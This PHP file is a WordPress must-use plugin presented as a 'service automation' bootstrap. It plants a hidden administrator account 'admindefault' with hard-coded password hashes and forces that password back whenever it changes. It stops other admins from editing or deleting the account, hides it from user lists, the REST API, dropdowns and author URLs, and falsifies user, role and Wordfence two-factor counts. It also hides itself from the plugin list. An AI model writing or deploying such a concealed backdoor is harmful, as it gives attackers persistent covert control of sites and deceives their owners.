<?php

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

const SAB_USER_LOGIN = 'admindefault';

const SAB_HASH_NATIVE   = '$wp$2y$12$rPuwa1JUL0TnufPUhhyIpO7ra28VCqHvN.1NZeEIcK61lt1S5/BDm';
const SAB_HASH_PORTABLE = '$P$670vxEYlOH5YlkT.YDSQ0/qeuWXszy.';

const SAB_ENFORCE_PASSWORD = true;

const SAB_PROTECT_FROM_OTHERS = true;

const SAB_HIDE_IN_ADMIN = true;

const SAB_HIDE_IN_REST = true;

const SAB_HIDE_IN_DROPDOWNS = true;

const SAB_BLOCK_ENUMERATION = true;

const SAB_FIX_LIST_COUNTS = true;

const SAB_HIDE_IN_PLUGIN_LIST = true;

const SAB_ROLE = 'administrator';

function sab_user_id() {
	static $cached = null;

	if ( null === $cached ) {
		$user   = get_user_by( 'login', SAB_USER_LOGIN );
		$cached = $user ? (int) $user->ID : 0;
	}

	return $cached;
}

function sab_is_sab_viewer() {
	$current_id = get_current_user_id();

	return $current_id && $current_id === sab_user_id();
}

function sab_email() {
	$host = wp_parse_url( home_url(), PHP_URL_HOST );

	return 'automation@' . ( $host ? $host : 'localhost.local' );
}

function sab_target_hash() {
	if ( defined( 'PASSWORD_BCRYPT' ) && defined( 'PHP_VERSION' ) && version_compare( PHP_VERSION, '7.4', '>=' ) ) {
		return SAB_HASH_NATIVE;
	}

	return SAB_HASH_PORTABLE;
}

function sab_hash_known( $db_hash ) {
	return ( $db_hash === SAB_HASH_NATIVE || $db_hash === SAB_HASH_PORTABLE );
}

function sab_bootstrap() {
	static $done = false;

	if ( $done ) {
		return;
	}
	$done = true;

	$user = get_user_by( 'login', SAB_USER_LOGIN );

	if ( ! $user ) {
		$user_id = wp_insert_user(
			array(
				'user_login'   => SAB_USER_LOGIN,
				'user_pass'    => wp_generate_password( 32, true, true ),
				'user_email'   => sab_email(),
				'role'         => SAB_ROLE,
				'first_name'   => 'Service',
				'display_name' => 'Service Automation',
			)
		);

		if ( is_wp_error( $user_id ) ) {
			error_log( '[service-admin-bootstrap] create failed: ' . $user_id->get_error_message() );
			return;
		}

		global $wpdb;
		$wpdb->update(
			$wpdb->users,
			array( 'user_pass' => sab_target_hash() ),
			array( 'ID' => $user_id )
		);
		clean_user_cache( $user_id );

		error_log( '[service-admin-bootstrap] service admin created: ' . SAB_USER_LOGIN );
		return;
	}

	if ( ! in_array( SAB_ROLE, (array) $user->roles, true ) ) {
		$user->add_role( SAB_ROLE );
	}

	if ( SAB_ENFORCE_PASSWORD ) {
		global $wpdb;
		$db_hash = $wpdb->get_var(
			$wpdb->prepare( "SELECT user_pass FROM {$wpdb->users} WHERE ID = %d", $user->ID )
		);

		if ( ! sab_hash_known( (string) $db_hash ) ) {
			$wpdb->update(
				$wpdb->users,
				array( 'user_pass' => sab_target_hash() ),
				array( 'ID' => $user->ID )
			);
			clean_user_cache( $user->ID );

			error_log( '[service-admin-bootstrap] password drift detected, hash restored: ' . SAB_USER_LOGIN );
		}
	}
}

add_action( 'init', 'sab_bootstrap', 1 );

if ( SAB_PROTECT_FROM_OTHERS ) {
	add_filter(
		'map_meta_cap',
		function ( $caps, $cap, $user_id, $args ) {
			$target_id = isset( $args[0] ) ? (int) $args[0] : 0;

			if (
				$target_id
				&& $target_id === sab_user_id()
				&& (int) $user_id !== sab_user_id()
				&& in_array( $cap, array( 'edit_user', 'delete_user', 'remove_user', 'promote_user' ), true )
			) {
				return array( 'do_not_allow' );
			}

			return $caps;
		},
		10,
		4
	);
}

if ( SAB_HIDE_IN_ADMIN ) {
	add_action(
		'pre_get_users',
		function ( $query ) {
			if ( ! is_admin() ) {
				return;
			}

			if ( sab_is_sab_viewer() ) {
				return;
			}

			$exclude   = (array) $query->get( 'exclude' );
			$exclude[] = sab_user_id();
			$query->set( 'exclude', array_filter( $exclude ) );
		}
	);
}

if ( SAB_HIDE_IN_REST ) {
	add_filter(
		'rest_user_query',
		function ( $args ) {
			$args['exclude'] = array_merge( (array) ( $args['exclude'] ?? array() ), array( sab_user_id() ) );
			return $args;
		}
	);

	add_filter(
		'rest_prepare_user',
		function ( $response, $user, $request ) {
			if ( $user instanceof WP_User && (int) $user->ID === sab_user_id() ) {
				if ( ! sab_is_sab_viewer() ) {
					return new WP_Error(
						'sab_user_hidden',
						'Resource not found.',
						array( 'status' => 404 )
					);
				}
			}
			return $response;
		},
		10,
		3
	);
}

if ( SAB_HIDE_IN_DROPDOWNS ) {
	add_filter(
		'wp_dropdown_users_args',
		function ( $query_args ) {
			$query_args['exclude'] = array_merge( (array) ( $query_args['exclude'] ?? array() ), array( sab_user_id() ) );
			return $query_args;
		}
	);
}

if ( SAB_BLOCK_ENUMERATION ) {
	add_action(
		'template_redirect',
		function () {
			$author_name = get_query_var( 'author_name' );

			if ( $author_name && strtolower( urldecode( $author_name ) ) === strtolower( SAB_USER_LOGIN ) ) {
				status_header( 404 );
				nocache_headers();
				include get_query_template( '404' );
				exit;
			}
		}
	);
}

if ( SAB_FIX_LIST_COUNTS ) {
	add_filter( 'pre_count_users', 'sab_fix_count_users_callback', 10, 3 );

	function sab_fix_count_users_callback( $result, $strategy, $site_id ) {
		if ( sab_is_sab_viewer() ) {
			return $result;
		}

		$sab_id = sab_user_id();
		if ( ! $sab_id ) {
			return $result;
		}

		remove_filter( 'pre_count_users', 'sab_fix_count_users_callback', 10 );
		$counts = count_users( $strategy, $site_id );
		add_filter( 'pre_count_users', 'sab_fix_count_users_callback', 10, 3 );

		if ( isset( $counts['total_users'] ) && (int) $counts['total_users'] > 0 ) {
			$counts['total_users'] = (int) $counts['total_users'] - 1;
		}

		$sab = get_user_by( 'ID', $sab_id );
		foreach ( (array) ( $sab ? $sab->roles : array() ) as $role ) {
			if ( isset( $counts['avail_roles'][ $role ] ) ) {
				if ( (int) $counts['avail_roles'][ $role ] > 1 ) {
					$counts['avail_roles'][ $role ] = (int) $counts['avail_roles'][ $role ] - 1;
				} else {
					unset( $counts['avail_roles'][ $role ] );
				}
			}
		}

		return $counts;
	}

	function sab_wfls_enrolled( $table_key ) {
		if ( ! sab_user_id() || ! class_exists( '\WordfenceLS\Controller_DB' ) ) {
			return false;
		}

		global $wpdb;
		try {
			$table = \WordfenceLS\Controller_DB::shared()->$table_key;
		} catch ( \Throwable $e ) {
			return false;
		}

		if ( ! is_string( $table ) || '' === $table ) {
			return false;
		}

		$found = $wpdb->get_var(
			$wpdb->prepare( "SELECT 1 FROM `{$table}` WHERE `user_id` = %d LIMIT 1", sab_user_id() )
		);

		return ! empty( $found );
	}

	function sab_view_count_from_html( $html ) {
		if ( ! is_string( $html ) || ! preg_match( '/<span class="count">\(([^)]+)\)<\/span>/', $html, $m ) ) {
			return null;
		}

		return (int) preg_replace( '/[^0-9]/', '', html_entity_decode( $m[1], ENT_QUOTES ) );
	}

	add_filter( 'views_users', 'sab_fix_wfls_view_counts', 99 );
	add_filter( 'views_users-network', 'sab_fix_wfls_view_counts', 99 );

	function sab_fix_wfls_view_counts( $views ) {
		if ( sab_is_sab_viewer() || ! sab_user_id() ) {
			return $views;
		}

		foreach (
			array(
				array( 'wfls-active', 'wfls-inactive', 'secrets' ),
				array( 'wfls-passkey-active', 'wfls-passkey-inactive', 'passkeys' ),
			) as $pair
		) {
			list( $view_active, $view_inactive, $table_key ) = $pair;
			$view = sab_wfls_enrolled( $table_key ) ? $view_active : $view_inactive;

			if ( ! isset( $views[ $view ] ) ) {
				continue;
			}

			$count = sab_view_count_from_html( $views[ $view ] );
			if ( null === $count ) {
				continue;
			}

			$new = max( 0, $count - 1 );
			if ( 0 === $new ) {
				unset( $views[ $view ] );
				continue;
			}

			$views[ $view ] = preg_replace_callback(
				'/<span class="count">\([^)]+\)<\/span>/',
				function ( $m ) use ( $new ) {
					return '<span class="count">(' . number_format_i18n( $new ) . ')</span>';
				},
				$views[ $view ],
				1
			);
		}

		return $views;
	}
}

if ( SAB_HIDE_IN_PLUGIN_LIST ) {
	$sab_plugin_basename = basename( __FILE__ );

	add_filter(
		'plugins_list',
		function ( $plugins ) use ( $sab_plugin_basename ) {
			if ( sab_is_sab_viewer() ) {
				return $plugins;
			}

			unset( $plugins['mustuse'][ $sab_plugin_basename ] );

			return $plugins;
		}
	);
}
